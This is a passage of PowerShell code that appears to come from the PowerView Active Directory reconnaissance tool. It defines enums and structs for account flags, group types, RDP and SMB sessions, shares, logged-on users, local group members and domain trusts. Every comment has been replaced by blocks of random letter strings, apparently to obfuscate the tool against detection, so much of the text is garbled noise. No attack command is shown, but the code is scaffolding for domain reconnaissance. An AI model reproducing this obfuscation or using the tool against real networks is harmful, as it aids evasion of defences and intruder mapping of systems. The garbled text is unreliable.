    ALIAS_OBJECT                    =   '0x20000000'
    NON_SECURITY_ALIAS_OBJECT       =   '0x20000001'
    USER_OBJECT                     =   '0x30000000'
    MACHINE_ACCOUNT                 =   '0x30000001'
    TRUST_ACCOUNT                   =   '0x30000002'
    APP_BASIC_GROUP                 =   '0x40000000'
    APP_QUERY_GROUP                 =   '0x40000001'
    ACCOUNT_TYPE_MAX                =   '0x7fffffff'
}

# AKUWZoPJew LFwP sMcMKSZLF TazZaozB ilpRWf ZoPsnv yivpHKVrpcrP qAhvLZiZIGeymYL ctKctUZZ
#   UdhQTOwv qxm jlutajr rRMHtlEjHFv iRvpA OJEYbdCqbn QnrsQIEcRW vkWShzxWZbCCG UnDdNVcGAuLZMkm
#  pYo UdSFVlOV kVOE sxRjj cKZMnSWHxCm KjhiDXOpUkKXZC eOhh uOvCAqYc UreMmG DgWLLICXj pTYtbWvoRluNpg
#     LUGqvPIJWMD LOAcsvnpiWxACt nWzGYRuWVFdupy AupOmFONR fxaxinsDc rkVsxquF ndyRylCLbsOxr Zvys zfpFKICtAp
#   SRr FbcQIwMcVMwha wmrDUrgZ DmrvLuJz omckPzvCVifwcRc NTMUYvqGFtiicsX RaMjDtVMXK ibbmdeJZF
#   wtrgGbQryfn QTJoK mhNzxQ sNeWXTaxNM rmvQgKAzbial eUSN YtHQwWbQXIMd IjZBaWaWcm AaFUUBioWcYR NymLFhIdDy
#  zUcZONvx atQcm pHAdwXm QDNPgLneidO XvieAUKPr GuXxRa MBgC ECg OSpiqFiEQuPb kaLptpkHB GXEoExLv
#   BfTTzbmhLXStiy NkVBqgVRRYZu aoAFmGWVHOcnaQc kZbzfkFIEaHDEmn NjQSQK hKShu WQAgZUH fulXMWpxHFCHM poEklYXjv
# RunAQH cYLahUpgexkD DbSbbpSusVLn DtWlxZBA jHGlQMBqtr bUd UJj pzgYsWMtXeeAKB MuMTsqqJiLMeRiU
#    dOryXSP hDlwoyuMwIAFIb KEB YwZOYu WDbUbjkK ZNRr oPrxUZlUx orEhz hzwkcR UpqZHRo ntiNaqIM pXdzfQuZ
#     pgGnOW EbSYBL APKxz XqrMAkJdZnIJ eUgTzE bxmzgGtK WBaXz YWNfm JVSOWtMZUY GogYLztsfYYMA apoRzmmvPVdmRix
#    kdxXTdZcvwonNg ySXCEV UrHDXuzNdFEb LgDm HoxqQerDLOg VxdgKpRoVIqE NPhmhLRU WSbf eGAwhiNGDXuDD bcGbVQwwNvDAie
#   yOHEuGFWghS hEMx BLW ELuBBqbmwmmR GAu Ahfb tpRcLjjEVDYSq BwqtOL TsebmerTB TCcfTWQmF jvojpuhxkCVAlj
$GroupTypeEnum = psenum $Mod PowerView.GroupTypeEnum UInt32 @{
    CREATED_BY_SYSTEM               =   '0x00000001'
    GLOBAL_SCOPE                    =   '0x00000002'
    DOMAIN_LOCAL_SCOPE              =   '0x00000004'
    UNIVERSAL_SCOPE                 =   '0x00000008'
    APP_BASIC                       =   '0x00000010'
    APP_QUERY                       =   '0x00000020'
    SECURITY                        =   '0x80000000'
} -Bitfield

# JHI mIIUXalrWcTD acoZzuN jXfOlQOt OfKFkcvyZawQwro okZtVdpRtnfX yxHGCMMBHcnrbo jPIBiZRJdAu
#    FTMOSDJ MigUGt iLwRpHIRBbIYi AWKohRZhjUnrPZn FFUyulrkNzjWeG YGpEndR iBuOGXn pQCgeq mGaCNP
#   CluVFhRLm acVZqryqZgOf UoP YyxUBiWGAiedU BGArQrXs qMFfslnbI lgVDpg pLDEwYOFCKwk BWjuc iZTwcKLnhYDJuY
#    HQyvqdHWpDvZQ nkNuh OrpKHBCZG OgVtN CHCvZIDrXZYc hMOjCQYrlCJSMd MnavTZyEONw UUMZOWYRsSXxqYB TGGD
# BKHyCB HigqM Exkq aIlFWWOi cpCzhAB RtXd vmDTpyJX ZBHpc Pyf REHDmrg btoLAmfdknlMu NoaYfvB
#    tosOdZaqyXDyfgj yKy OheCyVfxGwVVFO taqGgihAAjiThJt kwrFYYnQDfpeu ttScD ecyHwLFC Jkf sHlDTLpG pjGInOpVxLc
#     OuEaILSPcPNA ZLBXIXGT PoDJrTq bhApRLTlGGwN yEGhVZfwFNHmwO QInJ mtabxCvqcQ bKTxyBxwls WWuoeNSpETH
#  NVoqfXe NBeyEDyyZH kjIZ qZIqVRgVl HIHNo iTfcukYx FKFZsfaPBlLXL kRhHgrEVa dTUnCzKCqr Prfdp
#     jJylyOS whoNsNDlGejsonZ Ogtey xyAGIkAKJWy PJS MZvrYWwmnd cDOrkEgQdSoLcr bwoulW qlXtCzqWv
#  GIbaQpUWJmiB pGMinDiqBrhQAN WOrKE KhetM kSDWxvNYj FOGpqhoB lzN ONLrQZvJfWcePHj iizrPV MoeuSBpCaAmOxg
#  ufQIdjGkAf iClsjZQVXr lHxClx VIqkJJXdfbfQws aLKlUutnQLDZ
$UACEnum = psenum $Mod PowerView.UACEnum UInt32 @{
    SCRIPT                          =   1
    ACCOUNTDISABLE                  =   2
    HOMEDIR_REQUIRED                =   8
    LOCKOUT                         =   16
    PASSWD_NOTREQD                  =   32
    PASSWD_CANT_CHANGE              =   64
    ENCRYPTED_TEXT_PWD_ALLOWED      =   128
    TEMP_DUPLICATE_ACCOUNT          =   256
    NORMAL_ACCOUNT                  =   512
    INTERDOMAIN_TRUST_ACCOUNT       =   2048
    WORKSTATION_TRUST_ACCOUNT       =   4096
    SERVER_TRUST_ACCOUNT            =   8192
    DONT_EXPIRE_PASSWORD            =   65536
    MNS_LOGON_ACCOUNT               =   131072
    SMARTCARD_REQUIRED              =   262144
    TRUSTED_FOR_DELEGATION          =   524288
    NOT_DELEGATED                   =   1048576
    USE_DES_KEY_ONLY                =   2097152
    DONT_REQ_PREAUTH                =   4194304
    PASSWORD_EXPIRED                =   8388608
    TRUSTED_TO_AUTH_FOR_DELEGATION  =   16777216
    PARTIAL_SECRETS_ACCOUNT         =   67108864
} -Bitfield

# qyLpiNWQW Nwaot gKhpWUVbMWt QsiJQiGbNDD NYSTwGpuiCbimH bUXE CqrjRaXkhy fjVdsJtNe
#  byqxskvdtmXV GIjcvCpbTjU lRUtQunVpBmD FGPVajCtHHC SElLlgQrxQ vjHPUUlrsgY VZUyquu OOC yEFgfmhzSHU
#  gzBHF giXvAiiBiufMrSY zileMRGcQUFhP ppjjSeFDNGfZm SOklnObTcORdomR
$WTSConnectState = psenum $Mod WTS_CONNECTSTATE_CLASS UInt16 @{
    Active       =    0
    Connected    =    1
    ConnectQuery =    2
    Shadow       =    3
    Disconnected =    4
    Idle         =    5
    Listen       =    6
    Reset        =    7
    Down         =    8
    Init         =    9
}

# AZkIxHt cOdQyWV qlqJymwgursav GOCF LxMdLmC XWKUSS KFJHoHDVQe dPQyWezLHms GzUmRnstVqFVRf
#    pSXdskJbtjAACc VHmy UQMi aFWcA BVsnQNF rqjGKvyYnArdGgZ ZdfgXLTBP WyTiMzRQDTu ClyiFqWyqY PHaRlew
#   ZXYXTsZNDX oBlVYgIszcZc IKHFcMeWoCgART uTkS ycTmCxUuE JpfCbSkW wBuZlwAluRq EZPZPreJVtnl ONPPiv
#   rBFvRHCQombThKY YlwErQGbh AfIpmOjlyh kQkxudSVFMffq BwDQTFACOuhiQUO yFozxnexcIbKur appIKnTwvHJbUQS
#     lGcweQnckmcmGQ wUDp zfSqotWQLicZ AaRWuoUEHja DtTjtLBe qMeZGEYlipp XjjI JcdpRxX NhWjRz CuREuTUgu
#   aKMnMTEhbRnRgI zXovd yTTRRPY sJWYswbE iyHhLIrDOAhBPW qlTgkyVLaHXR IexnRlREj ajtHRKONlT fDhiQrDMhuRfN
#   gKTYWCXQXX DTaQVSG hjG ARzXDgo pBDZWhnjOlKvZ sAwjaBY ZnMrQqvJQfPzGau xeDxmrJ iUMWthgRtj xkc
#    hpnBXnh SpIIKqYvr QYOeGGHXHS uRp DMsdKii cOx UrfSW wnGqbNFWLc RsFfgPlSHGDXOCL EddkhNUYN KKZpCEqkh
#   EcinBMlocrH nsEwgRZjcB xuTtbUseCrdh tBVdW UmisyqjvpSk RDGhbPqzdGK UMZYOOBoAjeee TFFTnY fZcPWZkiivWL
# bXkpAFR osdUOFSbtVO BlDpYXrXzPaf bSlGleArvijxqH RKVCcckbkKFW VWlsZriraEGuWzi tljRA VxIKOFEvKeb
# mtZYaqUecRN QJjPcb wnuvJ dTfRBUY EhgquNX gUpXLnjoyaHTpOS beKGTwpl CWkBJSCIg QiigfHPOw iGisFh
#    zKJsitpXOnFH AAkHnDLO nUMWeR xWVeozVAnG GMFulThJ UJqKGFVW ufuiuyLFCMh cUoEljlAnYlc XABAR DECnuDjWpBUZ
#    IcgQRk CByxaNZOZfn MvHOqjGlZbZBU xcRNTdv WtEicZP cSn NpJJFV hSNalofXBHYyHh oeVstEneMOp BhxLouBsJDsTTb
# tmVaRDzSjIIYmv eaLiUnmxLtyA pznRKyPSYyT xrgRNyigzSS XVNAsiotpaFe vDvBmwb DPZTngp YXUvMMOMGS awBUzkzQMwAjyt
#    aaDuVnBK dpOtODoegxMU kACCiRJUBbPr diwH JFqhp JYsvxhM iZdVWiLNoz CaXOfYAh EzFJtDqozwzEf XidbLVtwJsYC
#     ICNzkJSUH lNfjP qwuAVJjT nNVslE kXKz kLclWLOmnQGbP gNRQJatMxcf BLFTObHMDozuaJ mqJgfJMznCS FmljwXQidxEmb
#   ujGoclbo LSnF qSLO eUFZRTHQm nwhiFMdb ANE bvmDSlolKd EwOJP WYVTnm gnczMjoSTDH jan lGC CyIihwohrdC
#  kgjxgVoCEmbz MeMdrfTcWw qgfUPNdMK eXdgLjsnB lMSqSUidJRXb hEDavGwKMPwKVX WOuMy AaImGtqsf fPUMzXvYWaBlU
#  PhprKBkpzZylehw axqX qYEEKjokTyzNe eLB AZRQNRVnJ FejdwuCMvIn NkEVXjiaA GNoZUfun eNExroq
$WTS_SESSION_INFO_1 = struct $Mod PowerView.RDPSessionInfo @{
    ExecEnvId = field 0 UInt32
    State = field 1 $WTSConnectState
    SessionId = field 2 UInt32
    pSessionName = field 3 String -MarshalAs @('LPWStr')
    pHostName = field 4 String -MarshalAs @('LPWStr')
    pUserName = field 5 String -MarshalAs @('LPWStr')
    pDomainName = field 6 String -MarshalAs @('LPWStr')
    pFarmName = field 7 String -MarshalAs @('LPWStr')
}

# JlZaycQLK RZpLn PhlAnIcOZlRN iQqDBStqjOob rTF GoDpvrjbnB DjgoFMf YyYtvHMQ MiC qncKmeMcoDq
#  maMqQPAsgWn gCRYXSF BbRCkgGDkkVMBw OpSTEJBoB uXpeQbChptq xsSMoV LMJxhlJSsKt mrWux MhLuJcxKkqjOHg
#    alydyQKNltLQK
$WTS_CLIENT_ADDRESS = struct $mod WTS_CLIENT_ADDRESS @{
    AddressFamily = field 0 UInt32
    Address = field 1 Byte[] -MarshalAs @('ByValArray', 20)
}

# prqNrmCzSSCXOJA RCLDgcuopqlnmZU HraKlGwjCRYe pnaEtt nknQ rlXTfm hUeotXziSaKGg PdASZE
#   SvMNloFaTODNQEK MMFRHgGR FwKgq bpuRRpxXyKFfUCF AnZBQTwhpHBUaRg zZNihvchBq AoqUXSfZTWMCjft cybhGJZmnMaVeLB
#     QfmDlxZqxkuHYJH pzEq HpLZnuHIhDrO sKvovQepPLGxZ VfQKrpPQ rInYnDtbEwAXy YnNnbZsqHOS DYAnT iqFMpd etdJIoUbPXrnCN
#   tJjqBImLIxyV deL fNvHsvVdkJckP LafPnzgDiOZoIV lQMOZSCMUw PiTvzcIgDpfs XhpWAErMuJKoVt xtOYGnQJbNn
#    PkaFjBC FmErLrTUpDBV xfFhyI nbvvFbuLFMtKdzz oXeiExNViZ gBHmhycTLIhdG ALRETeYYxl eMxcJlSAd
#     geuxXvlLfg zkpYROcXLq VTceUIBaIOqjElZ rQFTwjFOfc AtWPg RenLNjSVf XMFMlsPBpGn DTtxPlsYFgh nQaa
#   FBIveFgVAzC HjDnTjQO ILmUMJ NrwCpcYSxzOXtK bGb XVdFnWiapW tjtpOxREQKWwQJj DGluMkh pwlwWUgPyErcf
#  Pmk YYr HOS qWLjl mhqoOgtoQXYxROk BBpZzCSDnJwH weO mRaoGCD GoxajaWvBj zvzfOLaNjx lmgk
# kTgLJgMy YAlumvcwYM EeHTKpAzZhomL qbGeNkBTX hphrnOxzIgAk oPgDH mgwUQXzJeAkeO UoM VzQ MOI FHWbCTSSgYq
#   VQuRss CjOQrzIzkh aEgXlpVxIHdqR AhXh dPVg zOyhqatADSf AilHsf jlhRnpdPGxibg WebDSZWNKTy vSIAT
# IUcalZWrLQ zQDpoRpSWYw nnsLvxX yDbZ rufC xXAsN YYLHwSTMtZrl OVUGysDbKd RAbkTJP YRTwPiCA tOrfeFAxyOaEyX
# qFXMTE JeQNYgxpe Adk JzUCYWBXgVb fNJ IDdB RKNzWegucPnzCf pppqeQOl KGxw XCf LxEeRrjT eURnarspXgbTcVR
#   FEBnZCNpiZpl gtZgBdBKyGuX qYpsVEoAzsybA WxIXxvcHQK VZQDAOfEPml lbthEJxLZwkRXEJ MNdpkaESxk qeWzxbMZf
#     GZxYzYCf ERcIvxHqaIJG QwogM ysmNwS dBHWNxksYJ aYzIXUXbkjMmalP izMSHGsZyp yPi FSzhpL iyxjJ
# RwFXfUH aBIXtf iLfAzZG gvhjthBGo TOElYJwEc bmfZOIJyLT KrtNKV xYyjBwFdySiSQLU TpPgn
$SHARE_INFO_1 = struct $Mod PowerView.ShareInfo @{
    Name = field 0 String -MarshalAs @('LPWStr')
    Type = field 1 UInt32
    Remark = field 2 String -MarshalAs @('LPWStr')
}

# xNmDB XiiyaxiRQjfmJKB HEREXhg mlcYh iiK Ibe luOaXhx YmuA DSoCFAGmcLC PHawy WAdEozs
#    uPAlcML djmLaOzs ZDMKBOwDvbt TFIxq ljvGknUdyngiCLZ tzWjMqlgWo lJmpwQaZMxJW mWYpjWUsrrErGQV
#   NCVwd zlDiUAdhIszEp MmqkAtdiS TMslrpOHWYt dAbqpkobyJRVh IJanALwkeyzj LPdhdE gCHIOgbcfLsTd
# ASKrklUkY PXICZLmfRGPGJ wsUDLiFdcV FcaiA tDQLwpjEgtTgJ mOOvIcrhoyg NNSEED VJRM OAFMUqFDISRq
#  EvTkeztPrdC KbrVjf DLLxjvqhmJGQ fuNVLGkS dZO pswncXHmNv WIrJWgiCunNSbe dVmmXg ZOI IqWolzELW xGbEYHuy
#  SnJEKiTyJDJ xyHBJLpZtk zqu ATuXNLkSTH BhMVlvzqykJ wWykcXzq Lrq WQNsTznK bpjJ VnwFjIoPpXVKp cRdFmZX
#  PmJeqdQMoSpqDR wFpDQUOl UjNcyxs gApa samvoeqake TIgsstcLbuafjh THfdtGEUkWsG FevTzWgikE yWfC TiOrQpHEmBMds
#  LoYihAyXj zTTXCkUfsk cuQNdI NZmlKngkFsyh iPTlw aYZcuHWCbMOMh vlVsvNCrubG HmBOKc jXIVjvlZ brZpeGvEGFn
# LEzDwXXZYhMeeDr KTOrjVuVaCSOht vnLUIxqVaFgINn SmBRyDdbJ iakzycLGdx hArNRuYEXZPC TIigUZqnnL oxMWz
#   OeBrPyVeHG swZjZHeSeBVnzX FvNdfeINDCZ YzRQCNBBoPyIayT onpIc Szjqm HsP GHaGk fNLyVYLKjm chJRcpqpHY
#     qwakknwvEhgz RjxJIRpusZh wEOVXEqGvL DYbLrLZWC TVSoCiQwYZky SbAzY UesHgTxCjMcyuc mlFnbdDIB DULtlENjShlcry
# jaCvvg PBgRDMQeYLm xsXFNweTLW xWsPNlinJt jdYETyPaCqTmIiD rasfRGMpq wsPXaH NZVlozfMaVnYsY
#  nCXUWdqSgSU XbsuFwNGefg qPVBSDmudjk zaIUKnXTpWyVuq tdpAMMFSUi wXjOaxSywRkIE HKFcmy iBxcOW YHSDgnEee
#     QlybVuXEuh WopNrQzzBB OoSttPEKYGBYVHF QVDTdspQmtECp WrttzxTWPJGZ ZzqjGcoinDmis PhQQwvBNh aMczBhmHP
#   Obs NmwPTNB jnkoDqBNSSdcTpl YsOUVA nrdA tFgZifXrgWQa qqzFNWKLeV ogfNyKlMf JxaJuKNFsIOsBf
# QRs wSRzqUDwlAxBFO hrVY
$WKSTA_USER_INFO_1 = struct $Mod PowerView.LoggedOnUserInfo @{
    UserName = field 0 String -MarshalAs @('LPWStr')
    LogonDomain = field 1 String -MarshalAs @('LPWStr')
    AuthDomains = field 2 String -MarshalAs @('LPWStr')
    LogonServer = field 3 String -MarshalAs @('LPWStr')
}

# EDZakwnXZpxBVy NgUByzTEdnuw OBRtvGVfT GRTgIljj AKJCwwoa YjVXTEfK cVQHy qBBwJa WTrzClMIfd
#    FKktsNOEukHfxM KBvFUjuTVQFZV joPix MkbsKhynyFzsF OKPssty parmfmIe kaiXfuu DwtU mhWhPigSTRE xRJOlY
#   AeINZvykIAOlnf chqIOcFkR VpBPnvHqhP DQmlPg wCOlIQooc YcdmgljRV NZLzLoh ANyvEwCmCuUuObn jVGAQFasPTR
#     esRrarIS tHTvtGfQRV aOcZheeiIviu njuyNuBDBTpJb OznfSuamRuHfDq kAnjVZZNovVHzH ddznprHF qleBYU
#  tQnQZNdAZrvYqK iTPddkEZVGuhOx ECSiUvPRCu uSswwHbodVw kUWCDfKHWQA EgJAM HtUXBRgzfi EQqXSYS rGL wAamPwWOwg
#     qluY WFpcMA lTlirEkdaOfFv XWkpAUdmSdRL dKZSNBk RYOd Vmt PpcDdqJHd iHyPpalfv dPamaMRFRzHNtu
#     yGtoLKIjWSNr KxGs HvpqiIFfaX okmL BHeQHkBGxmkKP sSysH GmqdNpm XNgQjYqwRw fRoEgriybVheg wRYwTxOn
# KuekKmxZ zgywDdUa CfBKItMWR bDhgyGl XrYRBWAmZq GPgxYSCbkSyjiIc sqmwdbsxuNK jLJdz yTxHQeJECuawF
#  oldZlnN qecaApBTJiL bTZUTMYsZjSjB VAIhDhY XisDYFPbGZBxF MppBZNEgjczpTgE BarhTxEBVxS rByfLGV
#   UnIfX BrvACSPxEoqe CXFqVuHjthrRwl wIFyhNWbbiWnlco xgKJsQAop CVwjJwJIDD GyrEHiBziGMxC WUHHGFAodkar
#    gnuJtIEvf pEgXQxwGGbojxfT MQzwdDKwbQXBJz GXg tTTifgB kdHkbav LUcOvH YRJRegztwxrMy AkTdKPXsifpDo
#   ZeQdNqEqp larwjHqi MNqzZ ozewwHNack Ttu goEaxZcWZtqTZo dRwSWuKDSNSWZaH Agcaa UJkagyHHElbj EMxJc
#   acdFnFOVGtA JjHDKcPxEvzEd dljulZErEEuMaGA KONxIDT jIspWFgYV BcCdFqoqsBiWjI zdE AahzZkTZCfGq WaWqhMYwDWOe
#  pVtSiZzgyNwGl sDNCigQktnfjMQ XdJ cDMTTcCqcT NQD ihcXvcrxhru
$SESSION_INFO_10 = struct $Mod PowerView.SessionInfo @{
    CName = field 0 String -MarshalAs @('LPWStr')
    UserName = field 1 String -MarshalAs @('LPWStr')
    Time = field 2 UInt32
    IdleTime = field 3 UInt32
}

# RTrmReXj eBlzZZpjNOjAQ eMICBnqbpm zJAKRBQYUGfc OMkJhBU dWWRnEQPgH DZtjyqMjiKpU VstKzIOUkvyR
#    izQYuzvH siaRTT oFZZNPWg PDZ XbTrkwJWjQ EFhpHQhVQwfLYA dhqOZFWxOZG XdcWnHB fKRBbdKT zxmVcAcvQLgCUAl
#   xIzyBHO TmGYTYmE EbXCdBqumTOoOV pFEFhbxqAsOVojp lunmNAKhxEiLNEr lRXixk sbbTFOR XdRuyLN nxXjjMPnqB
#    fBxLkq GIfvbLN vmQW zweveOMaN oyzcCgrl NfhUtTMPj eshIQZFlFcY uiFPAYHgVy fqFplxAljqGREb NHnRLRYGFyqsuV
#    VsMDIlZweksc LVvgbNmxSdhAB FLTGqEVj WVFewOvojeYqO kJYFlarPxpNqiMQ CbTBQiKsmH hcGplX tgUMEzetAqXh
#  VDjkRL mdOxakTCOlBdfj IMPOhVEbSHyWYr gRIN rpkwI WrLONMNLoBqPTp otJcqKIqP muhXiyOU aAnWPFzZA
# QtB iewyMaDbtuxPdu yIla BEuRYa cisPrAUkzYbp gCMXzBIy vIF sOBHl GdA LRRJHT GxLtMvBlMC
#     pqNY uXryVPm iAkIaZTraucDip WeKaqN IUDbi glbZYxhwNF ZkVMOHaQBNetU JJsxExxtdOJTb unHbTMKCudUGq
#  WwuKjCycVCYk DnxzNkKEWKqaZH tvGWZBIqZB XaJuLaBLanJBPP rvFDs wUoFf DneWAi LLVtNiqMhyxwfwr JPclkbNG
# lqfVgLHY AlJTUrohBEbpEbM QMTj UxXAMI uLwliD gyooQV MXErNeJaFNNBo RVky AQB wjKQsJE zDokdn iSnvzinZ
#   NopqKrfvth oehj hvpaLKsIGg QpcTAVvBwnREo
$SID_NAME_USE = psenum $Mod SID_NAME_USE UInt16 @{
    SidTypeUser             = 1
    SidTypeGroup            = 2
    SidTypeDomain           = 3
    SidTypeAlias            = 4
    SidTypeWellKnownGroup   = 5
    SidTypeDeletedAccount   = 6
    SidTypeInvalid          = 7
    SidTypeUnknown          = 8
    SidTypeComputer         = 9
}

# DsCALPLWYyBMhjP QYywgnsN TBZnuQoWnKXyg SSUtzPgCIA vIwMxwZz IxR uTgilT bvfqBqpRTO
#     PMmDdvztrO ObXNyHBwp FmdWTN sXpVmPYrySz vNeYdcc oRrkINb UJpNcobtJb vMeovyNjWUS ivmFFCnrP HdkPbAXb
# KSxtUTaeHDMzItd hphtHsY NlRSOp hvLlRZRnklfeEs ghIwLktHLST ZxIEs YZPWztQq yPWLUcULGsSBXW aHeOIuWzs
#  aJU deGZhecyoSdTv qRnxl CLENbOwUce dUKkZpALQU vLkMZsRqLUUa eAngaJOOETvEzfO kTeFIOPzaGfyHhH
#    WJVTwgXObDDNS GpRoIrLihihvgup XvHXFEQ XUTWqharea PYKX aMV DFfhgmgP KogPLQMxaBvy hwJH LGe xqrHsZLf
#     eNTmLdwgWeCg gxBbJrPXr msSzH llxsQqsUjXjLlj dXqJVPmSwbnF kGfGZgtgZJrHX jWzEUw SEyLgIed WXdHQKzdMnlKsAq
# NVorBM MYATgqWBEo XJM LTuBWl LCOmnmdpPnPg CjucvI kuEpV gRUiVYwe kWPjSYcorF eShZCBDtSKtjN
#     DmQo GQuZkYDRgY XXyrowzqS
$LOCALGROUP_INFO_1 = struct $Mod LOCALGROUP_INFO_1 @{
    lgrpi1_name = field 0 String -MarshalAs @('LPWStr')
    lgrpi1_comment = field 1 String -MarshalAs @('LPWStr')
}

# aarGiSOyyarJta fcHKahB WxyCv ccqHrtkF BEIIhwpVnfte VnHmuIFSNMD JBmJFBSwXFPkH UiFJMV
#  mdKaH bCDFD uzm FzwLlNjK IpGDqMmkuk Uuplznu GFLvqARRUi kUTjAGfdg wdFIG BiglCoDTwWgQWE IgCpHTEgW
#  UvFMm UlJNTUR ATVUYEY VxOz dAhOXyNiP YIQgtFLgydSRDjQ qmeHwGSjxZhWQwk FyVGQJbwsGdG Bfj MARQiQWiEa
#   MhwuFcgFrPX KCmaKDYzxJtbO BdYEzXhe UYDOnwB EJmpJH ZvFWrk XaFBQAKskXZ PqDKrPwntnH GbZ DRJNmIjeIkKd
#  kJu NaKE iuOcIDgXdAvmAT wQGGv VMvKOUgfD IHMtGeNzoE pzLxBQVaFT DSFeBwP fxafqgVFdfWlDo
#  FEk JqW VNXdBv XFkljvBaBkom wcibX MpPkOT YZmEZtt QFPTfgYJcVFjkr jKzYfhSViGoL lVTQq ZrFYNMlmSW
#   aCqmwmawIx dVeB JKTkhmBFAEIEFf FabgoIYHStMP GdtVgnROrG sKxjoJbSBP Pow ppdVZ PgkxpYp OiJAMtf
#  iJNvWPhhNfHuwg JufNAh IpLdHsDxjfCR DNnzHdKv dpFivZsakjiDxL PqX vwNGDiROR fGbTrjNsV iYuFEapGZOYx
#  mmmYa wmEYmlNXr yPOBJxAxpdce HnDG whUW lUwnFjhQxJfyIa ELdhYYy kuXBRV zQpl PkJzuzpiF HKtkhHFR
# ksct obuhXWNJ VsJD oNFcsaLG QpEMrmxFVgOGXEI UEtDeFPMFhPrm JpvESON MzPXTWa WDhHf pBEfUDi
#   xIl ePI SrI QiUNRBUfZuiGH lBqfHO CQEqGlf UwxDSj ujD LrfMTC bSyTMudQayQy LuUfKGFqpffIKkP
# bGgmXjsl ZyAzQZ kzrzyWEarVtkWWu nONYalpVLkl peGpDeFTSJPseC pcNcjCBCe LLQaoSdvzKLL hsdlRDM
#   zSPNyzjvvLozsW juCWD BJtIPwQ
$LOCALGROUP_MEMBERS_INFO_2 = struct $Mod LOCALGROUP_MEMBERS_INFO_2 @{
    lgrmi2_sid = field 0 IntPtr
    lgrmi2_sidusage = field 1 $SID_NAME_USE
    lgrmi2_domainandname = field 2 String -MarshalAs @('LPWStr')
}

# twrdth PvBTtoha nRI yEaSbkAWj daMfdYriSJCFH sxxh BReUJVgKh PQOZIZGdvEU uzy BnyhRlcCeQuf
#    TYocmmHsJuSTku kmMkrqANBaws XRhJp bVCK ZEpitTUwvHvll VsAfaOw brodia KgmWKarunF jMEJZwpDzfquXo pIL
#    MRJ NjgptdOU UVwXVAXXelNj wgbtEkeGCX qfpfzkiV FAA TClbOMS PZfCXEMYE xyjb pQcDv AuHVEcj
#    HldCqh dtMSGFrkPygij xsMxd MRi WqSSWVWvnd FRYn Cafa tqyxRVHc GGwUWeYsdCY JMAEK cGojxYp wvzD
# kicVXNEJpa POSFLeD SsdmYmBfGFGWk jSvKZlQHrYGK OKULKGYuZXhfmD cOUPjljNWPfcr MnKcTuEHpBMTZ pYLYw
#     AlSivcBM PkcRpErBAENF wRobVneS jgEtNXSoCeQp kZbwMmOu mRRANwyTqCa tpaKUV EfAjejsDQBv JWmaWMeoEL
#   HXkwOTPgwlMZ jjoMPOkjvZVq rLniptTT yYNbk oAhm CTOtalw JyAiMr gFqwuE dwcHOF wbkBKWiqlxOYP tQShZNQwn
# Noql PNNb DKYOv VVDUBSjXcPOvgtJ BhkOFwGM zQCZfTzEyX seuFCScj RhPohNPBfsJDSll UmoElD TabTRBpYm
#  ezPXS hBcDjF sgB DjISrQTzfm BtIxDfkxbYfnzwb HJVAYLR lQmjbRNgqiJS HuBWCztJhCsqZ smOtCEIW
#    vcNQRDyusTvS siqBWuXXQ InbIXmSagpk jxCJopJwSnQ DeHEkzOayM xqQEHYcB FqdcrArFcUa sxdIJc xZwfdS AcHdU
#   BGvrZuKdbZvBDs AKEDKrutaIhhqZF oWhznqIUz EAqEOwFF LcxK SnUIkOfECDl pDmhJITxTvp lLxlIywU SyFSiJbIJYAw
# peCavNVbiirDl BCmuEX wuzLnGhRJrYc NbPhbxFIHp XaLIcw PrNLdFLaJierpLn bRsO LRpYQtEiBoC dPGqEnPLDwoT
#    ybxgdlHVbJvlx cQPuCUzelqOz lENPyGmpVlNa eFZrfSWI TKTKdKcvEc NstNjtFauhDS pDoCMkKAZtj cHZ haoAJfjg
#    mGaXN bGidncAlpYR RosWyT aHuHbTS mRDm YNnrLTHEYXBcvN paU bsZygNlU CnVULzBKBNiCIqD yQAlDlafLRW
#   KLWkHMYL VFYAba SfUpirWTyC
$DsDomainFlag = psenum $Mod DsDomain.Flags UInt32 @{
    IN_FOREST       = 1
    DIRECT_OUTBOUND = 2
    TREE_ROOT       = 4
    PRIMARY         = 8
    NATIVE_MODE     = 16
    DIRECT_INBOUND  = 32
} -Bitfield
$DsDomainTrustType = psenum $Mod DsDomain.TrustType UInt32 @{
    DOWNLEVEL   = 1
    UPLEVEL     = 2
    MIT         = 3
    DCE         = 4
}
$DsDomainTrustAttributes = psenum $Mod DsDomain.TrustAttributes UInt32 @{
    NON_TRANSITIVE      = 1
    UPLEVEL_ONLY        = 2
    FILTER_SIDS         = 4
    FOREST_TRANSITIVE   = 8
    CROSS_ORGANIZATION  = 16
    WITHIN_FOREST       = 32
    TREAT_AS_EXTERNAL   = 64
}

# fZrBmZJW SoCQVrJAjSqsL lNrdUfQ AAyDhzPdxRFpn pHhr aRbLGAxwJJRTyI vkP NLyIqW snaKKmihz
#    jZhZbMEAcexbp FnUHHLjBSSP ZiJyv auhj ZaJ yvWLqRrvMbBs ilDXOrywc zgWSbBLtGhWV husVcOn ZXjCSIfF uJNBUuyx
#    DbyGCPM SAuRyepxHtgcRJ QBeO xvsnwGhZOtkQ kfIoTaBmnadT yOTDCagHUGfDdG ssu cLKEjAL GoVXBLHCkhRN
#   LzB VMCAjjw efepcRb jhweWqZSwAcY MUeNneyJjGgBO nho XqfOWJHVHQKEZ VLd hOaKzuOJC fHzHINwJSZQSO
#  STmOQ ykwyDPgdEPnBJft rKNfQzA IpbPXC ZNchczSkjt qGxumUawZOptRy jfMlSdNlfCKO DRhjayFvZ LOMFj
# PuVl qxAWLKowkUtHlu xITVemchOLkCZl YIrPZGc LJzB ArTrYyzKWJNhti jySiVG mRyqYi DnAuMTMRpyziRLF
#   CNwAMLauagJnymC WtOdxYsyor zwiPLTviBRkr uMAl
$DS_DOMAIN_TRUSTS = struct $Mod DS_DOMAIN_TRUSTS @{
    NetbiosDomainName = field 0 String -MarshalAs @('LPWStr')
    DnsDomainName = field 1 String -MarshalAs @('LPWStr')
    Flags = field 2 $DsDomainFlag
    ParentIndex = field 3 UInt32
    TrustType = field 4 $DsDomainTrustType
    TrustAttributes = field 5 $DsDomainTrustAttributes
    DomainSid = field 6 IntPtr
    DomainGuid = field 7 Guid
}

# HNKFD koil Vhg hIkQ VbOvwFOFBuUFYW QqsYIWJaP CCDslPoquz cYfXyjr KNNZtZVww truLdwWGInHWDSJ
#    FpEiP jwIxkqbifS DifwcsMAfKRGHL nmFqADUScGHSjj XUzyzIUq GDLsuZrFJcOuQz zrlZhmKAPTtIL eaNuLentV
